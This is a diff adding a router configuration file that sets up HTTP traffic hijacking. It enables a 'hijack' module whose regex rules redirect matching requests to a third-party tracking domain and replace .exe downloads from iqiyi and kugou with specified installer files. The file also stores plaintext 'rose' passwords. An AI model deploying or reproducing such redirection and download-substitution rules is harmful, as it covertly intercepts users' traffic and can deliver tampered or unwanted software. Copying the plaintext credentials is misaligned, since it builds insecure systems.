@@ -1,0 +1,42 @@
+!
+! Zebra configuration saved from vty
+!
+hostname Rose
+password rose
+enable password rose
+log file /root/zebra.log
+itf tx enable
+itf rx enable
+interface 0 enable
+interface 1 enable
+interface bussiness add eth0
+domain default push
+snet default push
+adp interval 2
+adp switch template pc on
+adp switch template mobile off
+adp switch off
+hijack switch on
+hijack ip interval 100
+hijack ip time interval 0
+hijack pkt interval 100
+hijack ip pkt interval 100
+
+
+uri  add   1  .  push
+hjkwx  add   5    123.207.98.150/0    zm\.share2\.ucdns\.uc\.cn.*src=http    nmon.nmononlinesj.com/qasd/?pXiTde=1Q050f0i1w
+!hjkwx  add   2    210.73.208.247/31    \?t=    nmon.nmononlinesj.com/qasd/?pXiTde=1Q050f0i1w
+hjkwx  add   2    210.73.208.247/31    \?t=(?!0\.3642)    nmon.nmononlinesj.com/qasd/?pwi9dv=1m0r0X0R1j
+
+
+
+
+
+hjkwx   add    40   1.1.1.1/0  ^dl\.static\.iqiyi\.com\/hz\/.*\.exe   dl.static.iqiyi.com/hz/IQIYIsetup_wy@kb002.exe
+hjkwx   add    41   1.1.1.1/0  ^xiazai\.kugou.com\/Corp\/.*\.exe   xiazai.kugou.com/Corp/kugou7_3654.exe
+
+
+!
+line vty
+!
+
